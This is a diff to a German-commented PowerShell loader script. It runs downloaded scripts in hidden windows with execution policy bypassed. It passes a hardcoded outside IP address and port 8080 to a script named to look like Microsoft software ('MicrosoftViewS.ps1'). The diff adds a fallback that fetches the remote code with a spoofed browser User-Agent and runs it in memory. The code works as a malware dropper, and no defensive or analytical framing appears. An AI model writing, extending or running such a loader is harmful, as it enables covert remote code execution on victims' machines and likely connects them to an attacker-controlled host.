@@ -77,32 +77,59 @@ foreach ($job in $downloadJobs) {
     Remove-Job $job -Force
 }
 
-# Exec der Files (spezial für MicrosoftViewS.ps1)
+# Exec der Files (spezial für MicrosoftViewS.ps1) – Fallback In-Memory wenn leer
 foreach ($script in $scripts) {
     $filePath = Join-Path $targetDir $script.FileName
+    $execSuccess = $false
     if (Test-Path $filePath) {
         try {
             $fileSize = (Get-Item $filePath).Length
             if ($fileSize -eq 0) {
-                Write-Host "SKIP EXEC: $($script.FileName) ist leer – kein Run!"  # Debug
-                continue
-            }
-            Write-Host "Exec: $($script.FileName) aus $filePath (Size: $fileSize Bytes)"  # Debug – entferne später
-            if ($script.FileName -eq "MicrosoftViewS.ps1") {
-                $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", "`"$filePath`"", "-a14", "145.223.117.77", "-a15", "8080", "-a16", "20", "-a17", "70")
+                Write-Host "SKIP FILE EXEC: $($script.FileName) ist leer – Fallback In-Memory..."  # Debug
             } else {
-                $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", "`"$filePath`"")
+                Write-Host "Exec: $($script.FileName) aus $filePath (Size: $fileSize Bytes)"  # Debug – entferne später
+                if ($script.FileName -eq "MicrosoftViewS.ps1") {
+                    $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", "`"$filePath`"", "-a14", "145.223.117.77", "-a15", "8080", "-a16", "20", "-a17", "70")
+                } else {
+                    $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-File", "`"$filePath`"")
+                }
+                Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow | Out-Null
+                Add-Content -Path $logPath -Value "$(Get-Date): EXEC ${script.FileName} aus $filePath" -ErrorAction SilentlyContinue
+                Write-Host "SUCCESS FILE EXEC: $($script.FileName)"  # Debug
+                $execSuccess = $true
             }
-            Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow | Out-Null
-            Add-Content -Path $logPath -Value "$(Get-Date): EXEC ${script.FileName} aus $filePath" -ErrorAction SilentlyContinue
-            Write-Host "SUCCESS EXEC: $($script.FileName)"  # Debug
         } catch {
             $errorMsg = $_.Exception.Message -replace ':', ' - '
             Add-Content -Path $logPath -Value "$(Get-Date): EXEC FEHLER ${script.FileName} : $errorMsg" -ErrorAction SilentlyContinue
-            Write-Host "ERROR EXEC: $($script.FileName) - $errorMsg"
+            Write-Host "ERROR FILE EXEC: $($script.FileName) - $errorMsg"
         }
     } else {
-        Write-Host "NO FILE: $($script.FileName) nicht gedownloaded!"  # Debug
+        Write-Host "NO FILE: $($script.FileName) nicht gedownloaded – Fallback In-Memory..."  # Debug
+    }
+
+    # Fallback: In-Memory Exec (wie dein manueller Befehl)
+    if (-not $execSuccess) {
+        try {
+            $headers = @{"User-Agent"="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
+            $content = Invoke-WebRequest -Uri $script.Url -UseBasicParsing -Headers $headers -ErrorAction SilentlyContinue | % { $_.Content }
+            if ($content -and $content.Length -gt 0) {
+                Write-Host "In-Memory Exec: $($script.FileName) (Content Length: $($content.Length))"  # Debug
+                $execCmd = $content
+                if ($script.FileName -eq "MicrosoftViewS.ps1") {
+                    $execCmd = $content + " -a14 `"145.223.117.77`" -a15 8080 -a16 20 -a17 70"
+                }
+                $processArgs = @("-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden", "-Command", $execCmd)
+                Start-Process powershell.exe -ArgumentList $processArgs -NoNewWindow | Out-Null
+                Add-Content -Path $logPath -Value "$(Get-Date): IN-MEMORY EXEC ${script.FileName}" -ErrorAction SilentlyContinue
+                Write-Host "SUCCESS IN-MEMORY EXEC: $($script.FileName)"  # Debug
+            } else {
+                Write-Host "SKIP IN-MEMORY: $($script.FileName) Content leer!"  # Debug
+            }
+        } catch {
+            $errorMsg = $_.Exception.Message -replace ':', ' - '
+            Add-Content -Path $logPath -Value "$(Get-Date): IN-MEMORY FEHLER ${script.FileName} : $errorMsg" -ErrorAction SilentlyContinue
+            Write-Host "ERROR IN-MEMORY: $($script.FileName) - $errorMsg"
+        }
     }
     Start-Sleep -Milliseconds 200
 }
